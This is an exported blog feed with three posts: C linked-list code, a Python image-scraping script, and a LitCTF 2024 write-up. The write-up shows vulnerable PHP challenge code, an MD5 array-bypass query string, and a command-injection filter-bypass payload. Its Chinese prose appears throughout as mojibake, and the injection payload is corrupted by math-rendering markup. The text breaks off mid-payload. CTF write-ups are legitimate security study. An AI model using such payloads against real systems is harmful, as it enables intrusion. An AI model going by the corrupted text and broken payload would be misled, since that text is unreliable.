class="keyword">sizeof</span>(DNode));</span><br><span class="line">    p = GetElem(DL,i<span class="number">-1</span>);</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next-&gt;prior = s;</span><br><span class="line">    s-&gt;prior = p;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åˆ é™¤ç»“ç‚¹çš„å‡½æ•°çš„ä¸»ä½“</span></span><br><span class="line">DLinkList <span class="title function_">Delete</span><span class="params">(DLinkList DL,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    DLinkList p,q;</span><br><span class="line">    q = GetElem(DL,i);</span><br><span class="line">    p = q-&gt;prior;</span><br><span class="line"></span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next-&gt;prior = p;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AllFree</span><span class="params">(DLinkList DL)</span>&#123;</span><br><span class="line">    DLinkList p = DL-&gt;next,r;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        r = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(DL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="234-å¾ªç¯é“¾è¡¨"><a class="markdownIt-Anchor" href="#234-å¾ªç¯é“¾è¡¨">#</a> 2.3.4ã€å¾ªç¯é“¾è¡¨ï¼š</h2><h3 id="1-å¾ªç¯å•é“¾è¡¨"><a class="markdownIt-Anchor" href="#1-å¾ªç¯å•é“¾è¡¨">#</a> 1ã€å¾ªç¯å•é“¾è¡¨ï¼š</h3><p>â€‹å¾ªç¯å•é“¾è¡¨å’Œå•é“¾è¡¨çš„åŒºåˆ«åœ¨äºï¼Œè¡¨ä¸­æœ€åä¸€ä¸ªç»“ç‚¹çš„æŒ‡é’ˆä¸æ˜¯ NULL ï¼Œè€Œæ”¹ä¸ºæŒ‡å‘å¤´ç»“ç‚¹ï¼Œä»è€Œæ•´ä¸ªé“¾è¡¨å½¢æˆä¸€ä¸ªç¯ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/59bedaba5a4946ada2d61376dbaf51de.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨å¾ªç¯å•é“¾è¡¨ä¸­ï¼Œè¡¨å°¾ç»“ç‚¹çš„ next åŸŸæŒ‡å‘ L ï¼Œæ•…è¡¨ä¸­æ²¡æœ‰æŒ‡é’ˆåŸŸä¸º NULL çš„ç»“ç‚¹ï¼Œå› æ­¤ï¼Œå¾ªç¯å•é“¾è¡¨çš„åˆ¤ç©ºæ¡ä»¶ä¸æ˜¯å¤´ç»“ç‚¹çš„æŒ‡é’ˆæ˜¯å¦ä¸ºç©ºï¼Œè€Œæ˜¯å®ƒæ˜¯å¦ç­‰äºå¤´æŒ‡é’ˆã€‚</p><p>â€‹å¾ªç¯å•é“¾è¡¨çš„æ’å…¥ã€åˆ é™¤ç®—æ³•ä¸å•é“¾è¡¨çš„å‡ ä¹ä¸€æ ·ï¼Œæ‰€ä¸åŒçš„æ˜¯è‹¥æ“ä½œåœ¨è¡¨å°¾è¿›è¡Œï¼Œåˆ™æ‰§è¡Œçš„æ“ä½œä¸åŒï¼Œä»¥è®©å•é“¾è¡¨ç»§ç»­ä¿æŒå¾ªç¯çš„ç‰¹æ€§ã€‚å½“ç„¶ï¼Œæ­£å› ä¸ºå¾ªç¯å•é“¾è¡¨æ˜¯ä¸€ä¸ªç¯ï¼Œå› æ­¤åœ¨ä»»ä½•ä¸€ä¸ªä½å€ä¸Šçš„æ’å…¥å’Œåˆ é™¤æ“ä½œéƒ½æ˜¯ç­‰ä»·çš„ï¼Œæ— éœ€åˆ¤æ–­æ˜¯å¦æ˜¯è¡¨å°¾ã€‚</p><p>â€‹åœ¨å•é“¾è¡¨ä¸­åªèƒ½ä»è¡¨å¤´ç»“ç‚¹å¼€å§‹å¾€åé¡ºåºéå†æ•´ä¸ªé“¾è¡¨ï¼Œè€Œå¾ªç¯å•é“¾è¡¨å¯ä»¥ä»è¡¨ä¸­çš„ä»»æ„ä¸€ä¸ªç»“ç‚¹å¼€å§‹éå†æ•´ä¸ªé“¾è¡¨ã€‚æœ‰æ—¶å¯¹å¾ªç¯é“¾è¡¨ä¸è®¾å¤´æŒ‡é’ˆä»…è®¾å°¾æŒ‡é’ˆï¼Œä»¥ä½¿å¾—æ“ä½œæ•ˆç‡æ›´é«˜ã€‚å…¶åŸå› æ˜¯ï¼Œè‹¥è®¾çš„æ˜¯å¤´æŒ‡é’ˆï¼Œå¯¹åœ¨è¡¨å°¾æ’å…¥å…ƒç´ éœ€è¦ O (n) çš„æ—¶é—´å¤æ‚åº¦ï¼Œè€Œè‹¥è®¾çš„æ˜¯å°¾æŒ‡é’ˆ r ï¼Œr-&gt;next å³ä¸ºå¤´æŒ‡é’ˆï¼Œå¯¹åœ¨è¡¨å¤´æˆ–è¡¨å°¾æ’å…¥å…ƒç´ éƒ½åªéœ€è¦ O (1) çš„æ—¶é—´å¤æ‚åº¦ã€‚</p><h3 id="2-å¾ªç¯åŒé“¾è¡¨"><a class="markdownIt-Anchor" href="#2-å¾ªç¯åŒé“¾è¡¨">#</a> 2ã€å¾ªç¯åŒé“¾è¡¨ï¼š</h3><p>â€‹ç”±å¾ªç¯å•é“¾è¡¨çš„å®šä¹‰ä¸éš¾é€€å‡ºå¯»ä½ æ¢åŒé“¾è¡¨ã€‚ä¸åŒçš„æ˜¯åœ¨å¾ªç¯åŒé“¾è¡¨ä¸­ï¼Œå¤´ç»“ç‚¹çš„ prior æŒ‡é’ˆè¿˜è¦æŒ‡å‘è¡¨å°¾ç»“ç‚¹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/7aa6062623704f9abe809b2910d86dd6.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨å¾ªç¯åŒé“¾è¡¨ L ä¸­ï¼ŒæŸèŠ‚ç‚¹ *p ä¸ºå°¾ç»“ç‚¹æ—¶ï¼Œp-&gt;next == L ï¼›å½“å¾ªç¯åŒé“¾è¡¨ä¸ºç©ºè¡¨æ—¶ï¼Œå…¶å¤´ç»“ç‚¹çš„ prior åŸŸå’Œ next åŸŸéƒ½ç­‰äº L ã€‚</p><h2 id="235-é™æ€é“¾è¡¨"><a class="markdownIt-Anchor" href="#235-é™æ€é“¾è¡¨">#</a> 2.3.5ã€é™æ€é“¾è¡¨ï¼š</h2><p>â€‹é™æ€é“¾è¡¨å€ŸåŠ©æ•°ç»„æ¥æè¿°çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨ç»“æ„ï¼Œç»“ç‚¹ä¹Ÿæœ‰æ•°æ®åŸŸ data å’Œ æŒ‡é’ˆåŸŸ next ï¼Œä¸ä¹‹å‰çš„é“¾è¡¨ä¸­çš„æŒ‡é’ˆä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œçš„æŒ‡é’ˆæ˜¯ç»“ç‚¹çš„ç›¸å¯¹åœ°å€ï¼ˆæ•°ç»„ä¸‹æ ‡ï¼‰ï¼Œåˆç§°æ¸¸æ ‡ã€‚å’Œé¡ºåºè¡¨ä¸€æ ·ï¼Œé™æ€é“¾è¡¨ä¹Ÿè¦é¢„å…ˆåˆ†é…ä¸€æ®µè¿ç»­çš„å†…å­˜ç©ºé—´ã€‚</p><p>â€‹é™æ€é“¾è¡¨å’Œå•é“¾è¡¨çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/2a2e6df4ef5a4cc6b62218841143f149.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é™æ€é“¾è¡¨ç»“æ„ç±»å‹çš„æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">&#125;SLinkList[MaxSize];</span><br></pre></td></tr></table></figure><p>â€‹é™æ€é“¾è¡¨ä»¥ next == 1 ä½œä¸ºå…¶ç»“æŸçš„æ ‡å¿—ã€‚é™æ€é“¾è¡¨çš„æ’å…¥ã€åˆ é™¤æ“ä½œä¸åŠ¨æ€é“¾è¡¨çš„ç›¸åŒï¼Œåªéœ€è¦ä¿®æ”¹æŒ‡é’ˆï¼Œè€Œä¸éœ€è¦ç§»åŠ¨å…ƒç´ ï¼Œé™æ€é“¾è¡¨æ²¡æœ‰å•é“¾è¡¨ä½¿ç”¨èµ·æ¥æ–¹ä¾¿ï¼Œä½†åœ¨ä¸€äº›ä¸æ”¯æŒæŒ‡é’ˆçš„é«˜çº§è¯­è¨€ä¸­ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸å·§å¦™çš„è®¾è®¡æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è€ƒç ”ä¸“ä¸šè¯¾ </category>
          
          <category> æ•°æ®ç»“æ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšæœºäºŒæ¬¡å…ƒå›¾apiç›¸å…³</title>
      <link href="/posts/e3418ca3.html"/>
      <url>/posts/e3418ca3.html</url>
      
        <content type="html"><![CDATA[<h1 id="çˆ¬è™«è·å–æ‰€æœ‰å›¾ç‰‡"><a class="markdownIt-Anchor" href="#çˆ¬è™«è·å–æ‰€æœ‰å›¾ç‰‡">#</a> çˆ¬è™«è·å–æ‰€æœ‰å›¾ç‰‡ï¼š</h1><h2 id="èƒŒæ™¯"><a class="markdownIt-Anchor" href="#èƒŒæ™¯">#</a> èƒŒæ™¯ï¼š</h2><p>â€‹æœ€è¿‘åšä¸€äº› Web é¢˜ï¼Œå‘ç°äº†äº›ç½‘é¡µçš„èƒŒæ™¯ä¼šéšæœºå‡ºç°ï¼Œæ¯ä¸€æ¬¡åˆ·æ–°éƒ½ä¼šå‡ºç°ä¸ä¸€æ ·çš„å›¾ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ„æ€ï¼Œè¯•ç€ç ”ç©¶ä¸‹ï¼Œå½“ç„¶ï¼Œè‚¯å®šä¸æ˜¯ç ”ç©¶å’‹å¼„çš„è¿™ä¸ªï¼Œè€Œæ˜¯ï¼Œapi é‡Œçš„å›¾æ€ä¹ˆçˆ¬å–ï¼š</p><h2 id="é¦–å…ˆ"><a class="markdownIt-Anchor" href="#é¦–å…ˆ">#</a> é¦–å…ˆï¼š</h2><p>â€‹æ¥å£æ–‡æ¡£å¦‚ä¸‹ï¼š</p><p>ä¹‹åç›´æ¥ä¸Šæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pe</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3400</span>):</span><br><span class="line">        url = <span class="string">&quot;https://img.loliapi.cn/i/pe/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        resp = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;./img/pe/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(i)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;./img/pe/img&#123;&#125;.webpå·²å­˜åœ¨&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./img/pe/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(resp.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pc</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">690</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">&quot;https://img.loliapi.cn/i/pc/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        resp = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;./img/pc/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(i)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;./img/pc/img&#123;&#125;.webpå·²å­˜åœ¨&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./img/pc/img&#123;&#125;.webp&quot;</span>.<span class="built_in">format</span>(i),<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(resp.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    model = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> model == <span class="number">1</span>:</span><br><span class="line">        pc()</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="number">0</span>:</span><br><span class="line">        pe()</span><br></pre></td></tr></table></figure><h1 id="å‡ ä¸ªä¸é”™çš„api"><a class="markdownIt-Anchor" href="#å‡ ä¸ªä¸é”™çš„api">#</a> å‡ ä¸ªä¸é”™çš„ apiï¼š</h1><p>æ¨±èŠ±äºŒæ¬¡å…ƒå›¾ç‰‡ API-Dmoe</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG1vZS5jYy8=">https://www.dmoe.cc/</span></p><p>éšæœºå›¾ API</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly9pbWFnZS5hbm9zdS50b3AvaW5kZXguaHRtbA==">https://image.anosu.top/index.html</span></p><p>LoliApiï¼š</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmxvbGlhcGkuY29tLw==">https://docs.loliapi.com/</span></p><p>éšæœºå›¾ APIâ€”â€” éšæœºè¿”å›æˆ‘è€å©†ï¼ˆ</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmppdHN1LnRvcC9hcmNoaXZlcy8zLw==">https://blog.jitsu.top/archives/3/</span></p>]]></content>
      
      
      <categories>
          
          <category> å‘ç”µæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2024ã€‘LitCTF</title>
      <link href="/posts/4bf5e0ee.html"/>
      <url>/posts/4bf5e0ee.html</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Miscï¼š</h1><h2 id="1-æ¶è´ªæ‹å’Œä¼±-ç”¾7dÃ©æ¯å…®æ¯ç§’"><a class="markdownIt-Anchor" href="#1-æ¶è´ªæ‹å’Œä¼±-ç”¾7dÃ©æ¯å…®æ¯ç§’">#</a> 1ã€æ¶è´ªæ‹å’Œä¼±ã€ç”¾â€•â‘ºdÃ© æ¯å…®æ¯ç§’ï¼š</h2><p>â€‹é¢˜ç›®æè¿°ï¼šlaosebiï¼Œæ— è„‘ LSB éšå†™ï¼Œå…¨å–æœ€ä½ä½çš„ LSB éšå†™ï¼Œæ‹¿åˆ° flagã€‚æœ‰å¤§ä½¬ç›´æ¥<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT16c3RlZyZhbXA7c3BtPTEwMDEuMjEwMS4zMDAxLjcwMjA="> zsteg</span> ç§’äº†ï¼Œåœ¨è¿™é‡Œæä¸€ä¸‹</p><p><img data-src="https://img-blog.csdnimg.cn/direct/26e0013c62b2436084480bade59025b5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-ä½ è¯´å¾—å¯¹ä½†__"><a class="markdownIt-Anchor" href="#2-ä½ è¯´å¾—å¯¹ä½†__">#</a> 2ã€ä½ è¯´å¾—å¯¹ï¼Œä½†__</h2><p>â€‹ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œé€šè¿‡ foremost åˆ†ç¦»å›¾ç‰‡ï¼Œå¾—åˆ°å››å¼ å›¾ç‰‡ï¼Œæ¯ä¸€å¼ éƒ½æ˜¯ä¸€ä¸ªäºŒç»´ç çš„ä¸€éƒ¨åˆ†ï¼Œæ‹¼å‡ºæ¥æ‰«ä¸€ä¸‹å°±è¡Œäº†ï¼Œå®Œäº‹å„¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Genshin_St@rt!!&#125;</span><br></pre></td></tr></table></figure><h2 id="3-åŸé“å¯åŠ¨"><a class="markdownIt-Anchor" href="#3-åŸé“å¯åŠ¨">#</a> 3ã€åŸé“ï¼Œå¯åŠ¨ï¼</h2><p>â€‹å¥½ç¦»è°±çš„é¢˜ï¼Œä¸è¿‡é¢˜ç›®çš„æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘æ²¡å‘ç°ï¼Œæˆ‘çš„é—®é¢˜ï¼ŒåŸé“ï¼Œå†åŠ ä¸Šé¢˜ç›®æè¿°ï¼Œæ¨æµ‹åº”è¯¥æ˜¯åŸç¥å’Œå´©é“çš„é€šç”¨å­—ä½“ï¼Œç›´æ¥ä¸Šç½‘ç«™é‡Œå¯¹ç…§è¿™æ¥ï¼Œ<span class="exturl" data-url="aHR0cHM6Ly9nZW5zaGluLnByby1pdmFuLmNvbS9nZW5zaGluZm9udHRyYW5zbGF0b3IvZGVtby8lRUYlQkMlOEMlRTYlOUMlODAlRTUlOTAlOEUlRTUlOEYlOTElRTclOEUlQjAlRTUlODklOEQlRTUlOEQlOEElRTklODMlQTglRTUlODglODYlRTYlOTglQUYlRTUlOEUlOUYlRTclQTUlOUUlRUYlQkMlOEMlRTUlOTAlOEUlRTUlOEQlOEElRTklODMlQTglRTUlODglODYlRTYlOTglQUYlRTUlQjQlQTklRTklOTMlODElRTclOUElODQlRTUlQUQlOTclRTQlQkQlOTMlRUYlQkMlOUE=">https://genshin.pro-ivan.com/genshinfonttranslator/demo/ï¼Œæœ€åå‘ç°å‰åŠéƒ¨åˆ†æ˜¯åŸç¥ï¼ŒååŠéƒ¨åˆ†æ˜¯å´©é“çš„å­—ä½“ï¼š</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;good_gamer&#125;</span><br></pre></td></tr></table></figure><h2 id="4-ç›¯å¸§çç "><a class="markdownIt-Anchor" href="#4-ç›¯å¸§çç ">#</a> 4ã€ç›¯å¸§çç </h2><p>â€‹é¢˜ç›®ç»™äº†ä¸€å¼  jpg å›¾ç‰‡ï¼Œæ”¾åˆ° 010 é‡Œé¢å‘ç°æ–‡ä»¶å¤´ä¸º gif æ ¼å¼çš„ï¼Œä¿®æ”¹åç¼€åä½¿ç”¨å·¥å…·åˆ†ç¦»å¾—åˆ°ä¸€å †å›¾ç‰‡ï¼Œåœ¨å…¶ä¸­å¯ä»¥å‘ç°ç»„æˆ flag çš„éƒ¨åˆ†ï¼ˆæˆ‘çš„ 010 å‡ºäº†é—®é¢˜ï¼Œç ´è§£æ— æ•ˆäº†ï¼Œè¿™é‡Œå°±ä¸æ”¾ç…§ç‰‡äº†ï¼‰ï¼Œç„¶åæ˜¯ä¸€ä¸ª gif ä¸­é—´åµŒå¥—äº†å‡ å¼ åˆ†æ®µçš„ flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;You_are_really_staring_at_frames!&#125;</span><br></pre></td></tr></table></figure><h2 id="5-everywhere-we-go"><a class="markdownIt-Anchor" href="#5-everywhere-we-go">#</a> 5ã€Everywhere We Go</h2><p>â€‹éŸ³é¢‘éšå†™ï¼Œæ‰” Audacity é‡Œé¢ï¼Œé¢‘è°±å›¾é‡Œçœ‹åˆ°äº† flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Calculate_Step_By_Step&#125;</span><br></pre></td></tr></table></figure><h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Webï¼š</h1><h2 id="1ç™¾ä¸‡ç¾å…ƒçš„è¯±æƒ‘"><a class="markdownIt-Anchor" href="#1ç™¾ä¸‡ç¾å…ƒçš„è¯±æƒ‘">#</a> 1. ç™¾ä¸‡ç¾å…ƒçš„è¯±æƒ‘ï¼š</h2><p>â€‹å‰é¢çš„é¢˜ä¸ä¼šåšï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å¥½åº·çš„&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å¹²å·´çˆ¹å¹²å·´çˆ¹å…ˆè¾ˆ~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å¼€èƒƒå°èœ))&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">å¼€èƒƒå°èœ))</span><br></pre></td></tr></table></figure><p>â€‹çœ‹èµ·æ¥æŒºç®€å•çš„ï¼Œæ— è„‘æ•°ç»„ç»•è¿‡å®Œäº‹å„¿äº†ï¼špayload å¦‚ä¸‹</p><blockquote><p>?a[]=1&amp;b[]=2&amp;c[]=2025</p></blockquote><p>â€‹è·å¾—ä¸‹ä¸€ä¸ªæ–‡ä»¶æ˜¯./dollar.phpã€‚è®¿é—®ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>â€‹çªç„¶æ„è¯†åˆ°äº†ä¸ªé—®é¢˜ï¼Œè¿™é“é¢˜æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œflag æ‰€åœ¨çš„æ–‡ä»¶æ˜¯ 12.phpï¼Œç„¶åæ ¹æ® rce å‡½æ•°ï¼Œçœ‹æ¥æ˜¯æ„é€  12 è¿™ä¸ªæ•°å­—ï¼Œè¿™å°±å¥½åŠäº†ï¼Œç›´æ¥ä¸Š payloadï¼Œpayload å‚è€ƒæ–‡ç« ï¼š</p><p>ï¼š</p><blockquote><p>x=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>((<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(())))<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" 